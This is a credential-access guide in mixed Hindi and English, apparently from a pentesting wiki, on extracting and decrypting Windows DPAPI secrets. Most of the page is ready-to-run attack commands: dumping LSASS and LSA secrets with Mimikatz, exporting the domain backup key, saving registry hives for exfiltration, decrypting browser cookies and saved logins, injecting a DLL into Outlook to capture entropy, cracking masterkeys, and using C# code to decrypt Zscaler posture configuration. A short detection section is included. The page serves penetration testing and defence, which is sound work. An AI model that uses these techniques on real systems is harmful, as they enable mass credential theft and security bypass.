# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## What is DPAPI

The Data Protection API (DPAPI) विंडोज़ ऑपरेटिंग सिस्टम में मुख्य रूप से asymmetric private keys के **symmetric encryption** के लिए उपयोग किया जाता है, जो entropy के स्रोत के रूप में या तो user या system secrets का उपयोग करता है। यह तरीके डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है क्योंकि यह उन्हें उपयोगकर्ता के logon secrets से निकले हुए key या सिस्टम एन्क्रिप्शन के लिए सिस्टम के domain authentication secrets से निकले हुए key का उपयोग करके डेटा एन्क्रिप्ट करने की अनुमति देता है, इस प्रकार डेवलपर को एन्क्रिप्शन key की सुरक्षा स्वयं प्रबंधित करने की ज़रूरत नहीं रहती।

DPAPI का सबसे सामान्य उपयोग तरीका **`CryptProtectData` and `CryptUnprotectData`** फ़ंक्शन्स के माध्यम से है, जो applications को वर्तमान में logged on process के session के साथ डेटा को सुरक्षित रूप से encrypt और decrypt करने की अनुमति देते हैं। इसका मतलब है कि एन्क्रिप्ट किया गया डेटा केवल वही user या system ही डिक्रिप्ट कर सकता है जिसने उसे एन्क्रिप्ट किया था।

इसके अलावा, ये फ़ंक्शन्स एक **`entropy` parameter** भी स्वीकार करते हैं जिसका उपयोग एन्क्रिप्शन और डिक्रिप्शन दोनों में किया जाता है, इसलिए, किसी चीज़ को डिक्रिप्ट करने के लिए जो इस parameter का उपयोग करके एन्क्रिप्ट की गई हो, आपको वही entropy value प्रदान करनी होगी जो एन्क्रिप्शन के दौरान उपयोग की गई थी।

### Users key generation

DPAPI हर user के लिए उनके credentials के आधार पर एक अनूठी key (जिसे **`pre-key`** कहा जाता है) जेनरेट करता है। यह key user के password और अन्य कारकों से निकाली जाती है और algorithm user के प्रकार पर निर्भर करता है पर अंततः यह SHA1 बन जाती है। उदाहरण के लिए, domain users के लिए, **यह user के NTLM hash पर निर्भर करता है**।

यह विशेष रूप से दिलचस्प है क्योंकि अगर कोई attacker user का password hash प्राप्त कर लेता है, तो वे:

- **DPAPI का उपयोग करके एन्क्रिप्ट किए गए किसी भी डेटा को उस user की key से डिक्रिप्ट कर सकते हैं** बिना किसी API से संपर्क किए
- ऑफ़लाइन पासवर्ड को **क्रैक** करने की कोशिश कर सकते हैं ताकि वैध DPAPI key जेनरेट की जा सके

इसके अलावा, हर बार जब कोई user DPAPI का उपयोग करके कुछ डेटा एन्क्रिप्ट करता है, तो एक नया **master key** जेनरेट होता है। यह master key वास्तव में डेटा को एन्क्रिप्ट करने के लिए उपयोग की जाती है। प्रत्येक master key को उसे पहचानने के लिए एक **GUID** (Globally Unique Identifier) दिया जाता है।

Master keys स्टोर होते हैं **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory में, जहाँ `{SID}` उस user का Security Identifier है। master key को user के **`pre-key`** द्वारा एन्क्रिप्ट करके और recovery के लिए एक **domain backup key** द्वारा भी एन्क्रिप्ट करके स्टोर किया जाता है (तो वही key दो अलग-अलग पासों द्वारा 2 बार एन्क्रिप्ट होकर स्टोर होती है)।

ध्यान दें कि **master key को एन्क्रिप्ट करने के लिए उपयोग किया गया domain key domain controllers में रहता है और कभी बदलता नहीं है**, इसलिए अगर किसी attacker को domain controller तक पहुँच मिल जाती है, तो वे domain backup key निकाल सकते हैं और डोमेन के सभी users की master keys को डिक्रिप्ट कर सकते हैं।

एन्क्रिप्टेड blobs के headers के अंदर उस master key का **GUID** होता है जिसका उपयोग डेटा को एन्क्रिप्ट करने में किया गया था।

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

यह उस कुंजी के बारे में है जिसका उपयोग मशीन द्वारा डेटा को एन्क्रिप्ट करने के लिए किया जाता है। यह **DPAPI_SYSTEM LSA secret** पर आधारित है, जो एक विशेष कुंजी है जिसे केवल SYSTEM user ही एक्सेस कर सकता है। इस कुंजी का उपयोग उन डेटा को एन्क्रिप्ट करने के लिए किया जाता है जिन्हें सिस्टम स्वयं द्वारा एक्सेस करने की आवश्यकता होती है, जैसे मशीन-लेवल credentials या सिस्टम-व्यापक secrets।

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** इसे एक्सेस कर सकता है LSA secrets को dump करके, कमांड का उपयोग करते हुए: `mimikatz lsadump::secrets`
- यह secret registry के अंदर स्टोर होता है, इसलिए एक administrator **DACL permissions को modify करके इसे एक्सेस कर सकता है**। रजिस्ट्री पथ है: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- रजिस्ट्री hives से offline extraction भी संभव है। उदाहरण के लिए, टार्गेट पर एक administrator के रूप में, hives को सेव करके उन्हें exfiltrate करें:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
फिर अपने analysis box पर, hives से DPAPI_SYSTEM LSA secret पुनःप्राप्त करें और इसका उपयोग machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, आदि) को decrypt करने के लिए करें:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI द्वारा संरक्षित डेटा

DPAPI द्वारा सुरक्षित व्यक्तिगत डेटा में शामिल हैं:

- Windows creds
- Internet Explorer और Google Chrome के पासवर्ड और ऑटो-कम्प्लीशन डेटा
- Outlook और Windows Mail जैसे एप्लिकेशन के लिए ई-मेल और आंतरिक FTP अकाउंट के पासवर्ड
- शेयर्ड फ़ोल्डर्स, संसाधन, वायरलेस नेटवर्क, और Windows Vault के पासवर्ड, जिनमें एन्क्रिप्शन कीज़ भी शामिल हैं
- रिमोट डेस्कटॉप कनेक्शन्स, .NET Passport, और विभिन्न एन्क्रिप्शन और प्रमाणीकरण प्रयोजनों के लिए प्राइवेट कीज़ के पासवर्ड
- Credential Manager द्वारा प्रबंधित नेटवर्क पासवर्ड और CryptProtectData का उपयोग करने वाले एप्लिकेशन (जैसे Skype, MSN messenger, और अन्य) में व्यक्तिगत डेटा
- रजिस्टर के भीतर एन्क्रिप्टेड ब्लॉब्स
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- लोकल एडमिन विशेषाधिकारों के साथ, यह संभव है कि **access the LSASS memory** करके सभी जुड़े हुए उपयोगकर्ताओं की DPAPI master keys और SYSTEM key को निकाला जा सके।
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- यदि उपयोगकर्ता के पास local admin privileges हैं, वे **DPAPI_SYSTEM LSA secret** तक पहुँच सकते हैं ताकि machine master keys को डिक्रिप्ट कर सकें:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- यदि उपयोगकर्ता का पासवर्ड या NTLM हैश ज्ञात है, तो आप **उपयोगकर्ता की master keys को सीधे डिक्रिप्ट कर सकते हैं**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- यदि आप user के रूप में session के अंदर हैं, तो DC से **backup key to decrypt the master keys using RPC** मांगा जा सकता है। यदि आप local admin हैं और user logged in है, तो आप इसके लिए **steal his session token** कर सकते हैं:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## वॉल्ट सूची
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI एन्क्रिप्टेड डेटा तक पहुँच

### DPAPI एन्क्रिप्टेड डेटा खोजें

सामान्य उपयोगकर्ताओं की **सुरक्षित फ़ाइलें** निम्न स्थानों पर होती हैं:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- ऊपर दिए गए पथों में `\Roaming\` को `\Local\` से बदलकर भी जांचें।

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) फ़ाइल सिस्टम, रजिस्ट्री और B64 ब्लॉब्स में DPAPI encrypted blobs खोज सकता है:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) can be used to decrypt using DPAPI sensitive data like cookies.

#### Chromium/Edge/Electron त्वरित नुस्खे (SharpChrome)

- वर्तमान उपयोगकर्ता — saved logins/cookies का interactive decryption (यह Chrome 127+ app-bound cookies के साथ भी काम करता है क्योंकि अतिरिक्त key user के Credential Manager से user context में चलने पर resolve हो जाती है):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- ऑफलाइन विश्लेषण जब आपके पास केवल फ़ाइलें हों। पहले प्रोफ़ाइल की "Local State" से AES state key निकालें और फिर cookie DB को डिक्रिप्ट करने के लिए इसका उपयोग करें:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/remote triage — जब आपके पास DPAPI domain backup key (PVK) और target host पर admin हों:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- यदि आपके पास किसी उपयोगकर्ता का DPAPI prekey/credkey (LSASS से) है, तो आप password cracking छोड़ सकते हैं और सीधे profile data को decrypt कर सकते हैं:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
नोट्स
- नवीनतम Chrome/Edge बिल्ड कुछ कुकीज़ को "App-Bound" एन्क्रिप्शन के साथ स्टोर कर सकती हैं। अतिरिक्त app-bound key के बिना उन विशेष कुकीज़ का ऑफलाइन डिक्रिप्शन संभव नहीं है; इन्हें स्वचालित रूप से पुनः प्राप्त करने के लिए लक्षित उपयोगकर्ता संदर्भ में SharpChrome चलाएँ। नीचे संदर्भित Chrome security ब्लॉग पोस्ट देखें।

### एक्सेस कुंजियाँ और डेटा

- **SharpDPAPI का उपयोग करें** वर्तमान सत्र की DPAPI एन्क्रिप्टेड फ़ाइलों से क्रेडेंशियल्स प्राप्त करने के लिए:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **credentials की जानकारी प्राप्त करें** जैसे एन्क्रिप्टेड डेटा और guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

RPC का उपयोग करके उस उपयोगकर्ता के masterkey को decrypt करें जिसने **domain backup key** का अनुरोध किया है:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** टूल masterkey को डिक्रिप्ट करने के लिए इन आर्ग्यूमेंट्स का भी समर्थन करता है (ध्यान दें कि `/rpc` का उपयोग domains backup key प्राप्त करने के लिए किया जा सकता है, `/password` का उपयोग plaintext password के लिए किया जा सकता है, या `/pvk` से DPAPI domain private key फ़ाइल निर्दिष्ट की जा सकती है...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey का उपयोग करके data को Decrypt करें**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** टूल `credentials|vaults|rdg|keepass|triage|blob|ps` decryption के लिए इन arguments का भी समर्थन करता है (ध्यान दें कि `/rpc` का उपयोग करके domains backup key प्राप्त किया जा सकता है, `/password` का उपयोग करके plaintext password का उपयोग किया जा सकता है, `/pvk` से DPAPI domain private key file निर्दिष्ट की जा सकती है, `/unprotect` से current users session का उपयोग किया जा सकता है...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey को सीधे उपयोग करना (कोई पासवर्ड आवश्यक नहीं)

यदि आप LSASS को dump कर सकते हैं, तो Mimikatz अक्सर एक per-logon DPAPI key को उजागर करता है जिसे उपयोगकर्ता के masterkeys को decrypt करने के लिए उपयोग किया जा सकता है बिना plaintext password को जाने। इस मान को सीधे tooling को पास करें:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Decrypt कुछ डेटा **वर्तमान उपयोगकर्ता सत्र** का उपयोग करके:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py के साथ ऑफ़लाइन डिक्रिप्शन

यदि आपके पास लक्षित उपयोगकर्ता का SID और पासवर्ड (या NT hash) है, तो आप DPAPI masterkeys और Credential Manager blobs को पूरी तरह ऑफ़लाइन Impacket के dpapi.py का उपयोग करके डिक्रिप्ट कर सकते हैं।

- डिस्क पर अवशेष पहचानें:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- यदि फ़ाइल ट्रांसफ़र टूलिंग अस्थिर हो, तो फ़ाइलों को ऑन-होस्ट base64 करके आउटपुट कॉपी करें:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- masterkey को उपयोगकर्ता के SID और password/hash के साथ Decrypt करें:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- डिक्रिप्ट किए गए masterkey का उपयोग credential blob को डिक्रिप्ट करने के लिए करें:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
This workflow often recovers domain credentials saved by apps using the Windows Credential Manager, including administrative accounts (e.g., `*_adm`).

---

### वैकल्पिक **entropy** ("Third-party entropy") को संभालना

कुछ applications `CryptProtectData` को एक अतिरिक्त **entropy** वैल्यू पास करते हैं। इस वैल्यू के बिना blob को डिक्रिप्ट नहीं किया जा सकता, भले ही सही masterkey ज्ञात हो। इस तरह से सुरक्षित credentials को लक्षित करते समय इसलिए entropy प्राप्त करना अनिवार्य है (e.g. Microsoft Outlook, some VPN clients)।

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) एक user-mode DLL है जो target process के अंदर DPAPI functions को hook करता है और प्रदान की गई किसी भी optional entropy को पारदर्शी रूप से रिकॉर्ड करता है। EntropyCapture को **DLL-injection** मोड में `outlook.exe` या `vpnclient.exe` जैसे processes पर चलाने से एक फाइल आउटपुट होगी जो प्रत्येक entropy buffer को कॉल करने वाले process और blob के साथ मैप करती है। कैप्चर की गई entropy बाद में **SharpDPAPI** (`/entropy:`) या **Mimikatz** (`/entropy:<file>`) को दी जा सकती है ताकि डेटा डिक्रिप्ट किया जा सके।
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ने Windows 10 v1607 (2016) से शुरू होकर **context 3** मास्टरकी फॉर्मेट पेश किया। `hashcat` v6.2.6 (December 2023) ने hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) और **22102** (context 3) जोड़े, जिससे मास्टरकी फ़ाइल से सीधे उपयोगकर्ता पासवर्ड्स का GPU-accelerated cracking संभव हो गया। इसलिए हमलावर टार्गेट सिस्टम से इंटरैक्ट किए बिना word-list या brute-force attacks कर सकते हैं।

`DPAPISnoop` (2024) इस प्रक्रिया को स्वचालित करता है:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
यह टूल Credential और Vault blobs को भी parse कर सकता है, cracked keys से उन्हें decrypt करके cleartext passwords export कर सकता है।

### Access other machine data

In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. बेशक आपको उस मशीन तक पहुँचने में सक्षम होना चाहिए और निम्न उदाहरण में माना गया है कि **domain backup encryption key ज्ञात है**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## अन्य टूल

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक उपकरण है जो LDAP डायरेक्टरी से सभी उपयोगकर्ताओं और कंप्यूटरों के निष्कर्षण और RPC के माध्यम से domain controller backup key के निष्कर्षण को स्वचालित करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के IP पते resolve करेगी और सभी कंप्यूटरों पर smbclient चला कर सभी उपयोगकर्ताओं के DPAPI blobs प्राप्त करेगी और domain backup key के साथ सब कुछ decrypt कर देगी।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से निकाली गई कंप्यूटर सूची से आप हर सबनेट ढूँढ सकते हैं भले ही आप उन्हें पहले न जानते हों!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) स्वचालित रूप से DPAPI द्वारा सुरक्षित रहस्यों को dump कर सकता है। 2.x रिलीज़ ने शामिल किया:

* सैकड़ों होस्टों से blobs का समानांतर संग्रह
* **context 3** masterkeys का पार्सिंग और स्वत: Hashcat cracking एकीकरण
* Chrome "App-Bound" encrypted cookies के लिए सपोर्ट (अगले अनुभाग देखें)
* एक नया **`--snapshot`** मोड जो endpoints को बार-बार poll कर नए बनाए गए blobs का diff लेता है

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault फाइलों के लिए एक C# parser है जो Hashcat/JtR फॉर्मैट आउटपुट कर सकता है और वैकल्पिक रूप से स्वतः cracking invoke कर सकता है। यह Windows 11 24H1 तक के machine और user masterkey फॉर्मैट्स को पूरी तरह सपोर्ट करता है।


## सामान्य डिटेक्शन

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` और अन्य DPAPI-संबंधित डायरेक्टरीज़ में फाइलों तक पहुँच।
- खासकर नेटवर्क share जैसे **C$** या **ADMIN$** से।
- LSASS memory तक पहुँचने या masterkeys को dump करने के लिए **Mimikatz**, **SharpDPAPI** या समान टूलिंग का उपयोग।
- Event **4662**: *An operation was performed on an object* – इसे **`BCKUPKEY`** ऑब्जेक्ट तक पहुंच के साथ correlated किया जा सकता है।
- Event **4673/4674** जब कोई process *SeTrustedCredManAccessPrivilege* (Credential Manager) का अनुरोध करता है

---
### 2023-2025 कमजोरियाँ और पारिस्थितिकी तंत्र में बदलाव

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023)। नेटवर्क एक्सेस वाले एक attacker डोमेन सदस्य को इस तरह धोखा दे सकते थे कि वह एक malicious DPAPI backup key प्राप्त कर ले, जिससे user masterkeys का decryption संभव हो जाता। यह November 2023 cumulative update में patch किया गया था — administrators को सुनिश्चित करना चाहिए कि DCs और workstations पूरी तरह patched हों।
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ने legacy DPAPI-only सुरक्षा को बदल कर एक अतिरिक्त key जोड़ दी जो user के **Credential Manager** के अंतर्गत स्टोर होती है। अब cookies के offline decryption के लिए दोनों की आवश्यकता होती है: DPAPI masterkey और **GCM-wrapped app-bound key**। SharpChrome v2.3 और DonPAPI 2.x user context में चलने पर अतिरिक्त key recover कर सकते हैं।


### केस स्टडी: Zscaler Client Connector – SID से व्युत्पन्न Custom Entropy

Zscaler Client Connector कई configuration फाइलें `C:\ProgramData\Zscaler` के अंतर्गत स्टोर करता है (उदा. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)। प्रत्येक फाइल **DPAPI (Machine scope)** से encrypted होती है पर vendor **custom entropy** प्रदान करता है जिसे disk पर स्टोर करने के बजाय *runtime पर कैलकुलेट* किया जाता है।

Entropy दो तत्वों से पुनर्निर्मित की जाती है:

1. एक hard-coded secret जो `ZSACredentialProvider.dll` के अंदर embed है।
2. उस Windows खाते का **SID** जिसके लिए configuration है।

DLL द्वारा लागू किया गया algorithm समान है:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
क्योंकि गुप्त एक DLL में एम्बेड है जिसे डिस्क से पढ़ा जा सकता है, **किसी भी स्थानीय हमलावर के पास SYSTEM अधिकार होने पर वह किसी भी SID के लिए entropy को पुनः उत्पन्न कर सकता है** और blobs को ऑफ़लाइन डीक्रिप्ट कर सकता है:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
डिक्रिप्शन पूर्ण JSON कॉन्फ़िगरेशन देता है, जिसमें हर **device posture check** और उसका अपेक्षित मान शामिल होता है — यह client-side bypasses की कोशिशों में बहुत मूल्यवान जानकारी है।

> TIP: अन्य एन्क्रिप्टेड artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) are protected with DPAPI **without** entropy (`16` zero bytes). वे इसलिए SYSTEM privileges मिलने के बाद सीधे `ProtectedData.Unprotect` के साथ डिक्रिप्ट किए जा सकते हैं।

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
